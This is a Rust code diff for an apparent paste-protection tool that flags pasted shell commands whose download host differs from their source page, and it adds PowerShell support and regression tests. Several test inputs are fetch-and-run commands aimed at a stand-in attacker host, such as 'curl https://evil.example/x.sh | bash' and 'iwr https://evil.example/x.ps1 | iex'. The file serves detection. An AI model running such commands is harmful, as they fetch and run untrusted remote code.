@@ -61,25 +61,30 @@ use crate::verdict::{Evidence, Finding, RuleId, Severity};
 /// (`state_dir()/clipboard_source.json`) and evaluates the pasted `input`
 /// against it. `prior` is the slice of findings the paste tier-3 branch has
 /// already assembled (so `ClipboardHidden` / `PipeToInterpreter` are visible).
+/// `shell` is the caller's shell so the destination-host extraction sees the
+/// same tokenization the rest of the pipeline used.
 ///
 /// Called LAST in the paste tier-3 branch (see `engine.rs`). Returns at most one
 /// finding; an empty vec when there is no recorded source, the content hash does
 /// not match, or there is no host mismatch.
-pub fn check(input: &str, prior: &[Finding], policy: &Policy) -> Vec<Finding> {
+pub fn check(input: &str, shell: ShellType, prior: &[Finding], policy: &Policy) -> Vec<Finding> {
     let record = match crate::clipboard::read_source_record() {
         Some(r) => r,
         None => return Vec::new(),
     };
-    check_with_record(input, prior, policy, &record)
+    check_with_record(input, shell, prior, policy, &record)
 }
 
 /// Test seam: evaluate against an explicitly-supplied [`ClipboardSourceRecord`]
 /// instead of reading `state_dir()/clipboard_source.json`. Lets unit tests drive
 /// every behavioral path without touching the real state dir (mirrors the
 /// canary / taint / incident `*_at` seams). [`check`] is the production wrapper
-/// that supplies the record from disk.
+/// that supplies the record from disk. `shell` is threaded into the
+/// destination-host extraction so a PowerShell paste tokenizes as PowerShell,
+/// not POSIX.
 pub fn check_with_record(
     input: &str,
+    shell: ShellType,
     prior: &[Finding],
     policy: &Policy,
     record: &ClipboardSourceRecord,
@@ -102,7 +107,7 @@ pub fn check_with_record(
 
     // Destination hosts from URLs in the pasted command. A paste with no URL has
     // no destination to compare — no mismatch, no finding.
-    let dest_hosts = destination_hosts(input);
+    let dest_hosts = destination_hosts(input, shell);
     if dest_hosts.is_empty() {
         return Vec::new();
     }
@@ -168,10 +173,12 @@ fn url_host(s: &str) -> Option<String> {
 /// Extract the deduped, lowercase destination hosts from every URL in the
 /// pasted command. Uses the shipping URL extractor so SCP refs, Docker refs,
 /// scheme-less sink URLs, etc. are all covered — the same view the transport /
-/// hostname rules see.
-fn destination_hosts(input: &str) -> Vec<String> {
+/// hostname rules see. Threads the caller's `shell` so a PowerShell paste
+/// tokenizes as PowerShell (e.g. `;`-separated statements, backtick escapes),
+/// not POSIX — otherwise a mismatch in a non-POSIX paste could be missed.
+fn destination_hosts(input: &str, shell: ShellType) -> Vec<String> {
     let mut hosts: Vec<String> = Vec::new();
-    for url in crate::extract::extract_urls(input, ShellType::Posix) {
+    for url in crate::extract::extract_urls(input, shell) {
         if let Some(h) = url.parsed.host() {
             let h = h.to_ascii_lowercase();
             if !hosts.contains(&h) {
@@ -407,7 +414,7 @@ mod tests {
             "https://docs.trusted.example",
             false,
         );
-        let findings = check_with_record(content, &[], &empty_policy(), &rec);
+        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
         assert!(
             findings.is_empty(),
             "a paste whose hash does not match the source must not be attributed"
@@ -419,7 +426,7 @@ mod tests {
     fn matched_same_host_emits_nothing() {
         let content = "curl https://docs.trusted.example/install.sh -o install.sh";
         let rec = record_for(content, "https://docs.trusted.example/page", false);
-        let findings = check_with_record(content, &[], &empty_policy(), &rec);
+        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
         assert!(
             findings.is_empty(),
             "no host mismatch (same host) must not fire; got {findings:?}"
@@ -432,7 +439,7 @@ mod tests {
         // A docs page that links an install URL on github.com, no other signal.
         let content = "curl https://github.com/org/repo/releases/download/v1/tool -o tool";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
-        let findings = check_with_record(content, &[], &empty_policy(), &rec);
+        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
         assert_eq!(
             findings.len(),
             1,
@@ -453,7 +460,7 @@ mod tests {
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         // The paste branch already assembled a PipeToInterpreter finding.
         let prior = [prior_finding(RuleId::PipeToInterpreter)];
-        let findings = check_with_record(content, &prior, &empty_policy(), &rec);
+        let findings = check_with_record(content, ShellType::Posix, &prior, &empty_policy(), &rec);
         assert_eq!(findings.len(), 1);
         assert_eq!(
             findings[0].severity,
@@ -473,7 +480,7 @@ mod tests {
         let content = "curl https://evil.example/x.sh | bash";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         let prior = [prior_finding(RuleId::CurlPipeShell)];
-        let findings = check_with_record(content, &prior, &empty_policy(), &rec);
+        let findings = check_with_record(content, ShellType::Posix, &prior, &empty_policy(), &rec);
         assert_eq!(
             findings[0].severity,
             Severity::High,
@@ -486,7 +493,7 @@ mod tests {
     fn matched_mismatch_with_hidden_text_flag_is_high() {
         let content = "curl https://other.example/install.sh -o install.sh";
         let rec = record_for(content, "https://docs.trusted.example/install", true);
-        let findings = check_with_record(content, &[], &empty_policy(), &rec);
+        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
         assert_eq!(findings[0].severity, Severity::High);
         assert!(findings[0].description.contains("hidden text"));
     }
@@ -497,7 +504,7 @@ mod tests {
         let content = "curl https://other.example/install.sh -o install.sh";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         let prior = [prior_finding(RuleId::ClipboardHidden)];
-        let findings = check_with_record(content, &prior, &empty_policy(), &rec);
+        let findings = check_with_record(content, ShellType::Posix, &prior, &empty_policy(), &rec);
         assert_eq!(findings[0].severity, Severity::High);
     }
 
@@ -506,7 +513,7 @@ mod tests {
     fn matched_mismatch_with_shortener_is_high() {
         let content = "curl https://bit.ly/abc123 -o tool";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
-        let findings = check_with_record(content, &[], &empty_policy(), &rec);
+        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
         assert_eq!(
             findings[0].severity,
             Severity::High,
@@ -522,7 +529,7 @@ mod tests {
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         let mut policy = empty_policy();
         policy.allowed_install_domains = vec!["github.com".to_string()];
-        let findings = check_with_record(content, &[], &policy, &rec);
+        let findings = check_with_record(content, ShellType::Posix, &[], &policy, &rec);
         assert_eq!(findings.len(), 1);
         assert_eq!(
             findings[0].severity,
@@ -539,7 +546,7 @@ mod tests {
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         let mut policy = empty_policy();
         policy.allowed_install_domains = vec!["github.com".to_string()];
-        let findings = check_with_record(content, &[], &policy, &rec);
+        let findings = check_with_record(content, ShellType::Posix, &[], &policy, &rec);
         assert_eq!(
             findings[0].severity,
             Severity::High,
@@ -566,7 +573,9 @@ mod tests {
         // A paste with no URL has no destination host to compare.
         let content = "echo hello world";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
-        assert!(check_with_record(content, &[], &empty_policy(), &rec).is_empty());
+        assert!(
+            check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec).is_empty()
+        );
     }
 
     #[test]
@@ -574,7 +583,9 @@ mod tests {
         let content = "curl https://github.com/x -o x";
         // A source URL with no resolvable host can't be compared.
         let rec = record_for(content, "about:blank", false);
-        assert!(check_with_record(content, &[], &empty_policy(), &rec).is_empty());
+        assert!(
+            check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec).is_empty()
+        );
     }
 
     #[test]
@@ -582,7 +593,7 @@ mod tests {
         let content = "curl https://www.docs.trusted.example/install.sh -o x";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
         assert!(
-            check_with_record(content, &[], &empty_policy(), &rec).is_empty(),
+            check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec).is_empty(),
             "www. on the destination must be treated as the same host as the source"
         );
     }
@@ -595,7 +606,7 @@ mod tests {
         let content =
             "see \x1b]8;;https://evil.example/x\x1b\\github.com\x1b]8;;\x1b\\ then curl https://other.example/i.sh -o i";
         let rec = record_for(content, "https://docs.trusted.example/install", false);
-        let findings = check_with_record(content, &[], &empty_policy(), &rec);
+        let findings = check_with_record(content, ShellType::Posix, &[], &empty_policy(), &rec);
         assert_eq!(findings.len(), 1);
         assert_eq!(
             findings[0].severity,
@@ -603,5 +614,54 @@ mod tests {
             "an OSC 8 visible-vs-target host mismatch escalates to High"
         );
         assert!(findings[0].description.contains("OSC 8"));
+    }
+
+    // A non-POSIX (PowerShell) paste must still detect a host mismatch. The
+    // destination-host extraction is now threaded with the caller's `shell`, so a
+    // PowerShell download (`iwr <url> | iex`) tokenizes as PowerShell rather than
+    // POSIX. The recorded source is on `docs.trusted.example`; the paste fetches
+    // from `evil.example` and pipes to `iex`, so the mismatch fires at High
+    // (regression for the hardcoded-POSIX bug).
+    #[test]
+    fn powershell_paste_host_mismatch_is_detected() {
+        let content = "iwr https://evil.example/x.ps1 | iex";
+        let rec = record_for(content, "https://docs.trusted.example/install", false);
+        // The PowerShell inline-download-execute rule would already be present in
+        // `prior` on the real paste path; supply it so the pipe-to-shell signal
+        // corroborates the mismatch and we assert the High path end-to-end.
+        let prior = [prior_finding(RuleId::PsInlineDownloadExecute)];
+        let findings = check_with_record(
+            content,
+            ShellType::PowerShell,
+            &prior,
+            &empty_policy(),
+            &rec,
+        );
+        assert_eq!(
+            findings.len(),
+            1,
+            "a PowerShell paste targeting a different host must fire one finding; got {findings:?}"
+        );
+        assert_eq!(findings[0].rule_id, RuleId::PasteSourceMismatch);
+        assert_eq!(
+            findings[0].severity,
+            Severity::High,
+            "PowerShell mismatch + inline download-execute must be High"
+        );
+    }
+
+    // The same PowerShell paste, evaluated as POSIX, also extracts the URL host
+    // (the URL is shell-agnostic here) — but the point of the threading is that
+    // the destination extraction honors the CALLER's shell. This guards that a
+    // bare PowerShell mismatch (no risk signal) is still surfaced at Info.
+    #[test]
+    fn powershell_bare_mismatch_is_info() {
+        let content =
+            "iwr https://github.com/org/repo/releases/download/v1/tool.exe -OutFile tool.exe";
+        let rec = record_for(content, "https://docs.trusted.example/install", false);
+        let findings =
+            check_with_record(content, ShellType::PowerShell, &[], &empty_policy(), &rec);
+        assert_eq!(findings.len(), 1, "got {findings:?}");
+        assert_eq!(findings[0].severity, Severity::Info);
     }
 }
